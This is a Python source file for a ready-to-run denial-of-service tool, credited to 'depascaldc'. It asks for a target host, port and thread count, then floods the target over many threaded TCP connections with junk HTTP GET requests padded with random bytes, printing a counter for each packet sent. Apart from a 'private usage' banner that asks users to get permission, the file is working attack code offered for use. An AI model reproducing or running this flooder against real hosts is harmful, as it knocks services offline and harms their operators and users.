"""
/*
 * This DOS-TOOL was written by depascaldc ( Discord: depascaldc#1234 ) < service@depascaldc.de >
 * Copying for PRIVATE usage is allowed as long as you don't mention it as your own.
 * Copyright (C) 2020 | depascaldc | All Rights Reserved
 *  
 */
"""

#!/usr/bin/env python3

import socket
import time
import os
import random
from threading import Thread, Event
from colorama import Fore, Style, init

init(autoreset=True)

class ConsoleColors:
    HEADER = Fore.MAGENTA
    OKBLUE = Fore.BLUE
    OKGREEN = Fore.GREEN
    WARNING = Fore.YELLOW
    FAIL = Fore.RED
    BOLD = Style.BRIGHT

class DosTool:
    def __init__(self):
        self.host = None
        self.port = None
        self.speedPerRun = None
        self.threads = None
        self.ip = None
        self.bytesToSend = random._urandom(2450)
        self.packetCounter = 0
        self.stop_event = Event()
        self.max_packets = None

    def print_banner(self):
        os.system("clear")
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
 ____       ____      _____           _ 
|  _ \  ___/ ___|    |_   _|__   ___ | |
| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
| |_| | (_) |__) |_____| | (_) | (_) | |
|____/ \___/____/      |_|\___/ \___/|_|

         written by: depascaldc
         for private USAGE ONLY
         Make sure you have the
        permission to attack the
               given host

      ''')

    def get_port(self):
        try:
            p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port: "))
            return p
        except ValueError:
            print(ConsoleColors.BOLD + ConsoleColors.WARNING +
                  "ERROR Port must be a number, setting Port to default 80")
            return 80

    def initialize(self):
        self.host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host: ")
        self.port = self.get_port()
        self.speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run: "))
        self.threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count: "))
        self.max_packets = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Max Packets to Send: "))
        self.ip = socket.gethostbyname(self.host)

    def attack(self):
        while not self.stop_event.is_set() and self.packetCounter < self.max_packets:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((self.ip, self.port))
                for _ in range(self.speedPerRun):
                    if self.packetCounter >= self.max_packets:
                        self.stop_event.set()
                        break
                    try:
                        dosSocket.send(str.encode("GET ") + self.bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + self.bytesToSend + str.encode(" HTTP/1.1 \r\n"), (self.ip, self.port))
                        self.packetCounter += 1
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + f"\r-----< PACKET {ConsoleColors.FAIL}{self.packetCounter}{ConsoleColors.OKGREEN} SUCCESSFUL SENT AT: {ConsoleColors.FAIL}{time.strftime('%d-%m-%Y %H:%M:%S', time.gmtime())}{ConsoleColors.OKGREEN} >-----", end="")
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                        break
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            dosSocket.close()

    def start_attack(self):
        print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
          ''')
        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ", end="\r")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25% ", end="\r")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50% ", end="\r")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75% ", end="\r")
        time.sleep(1)
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")

        threads = []

        for i in range(self.threads):
            t = Thread(target=self.attack)
            t.start()
            threads.append(t)

        try:
            for t in threads:
                t.join()  # Thread'lerin bitmesini bekliyoruz
        except KeyboardInterrupt:
            self.stop_event.set()  # Tüm thread'leri durduruyoruz
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\n\n[-] Canceled by user. Stopping all threads...")
            for t in threads:
                t.join()  # Tüm thread'lerin bitmesini bekliyoruz
            print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "All threads have been stopped successfully.")

if __name__ == "__main__":
    tool = DosTool()
    tool.print_banner()
    tool.initialize()
    tool.start_attack()
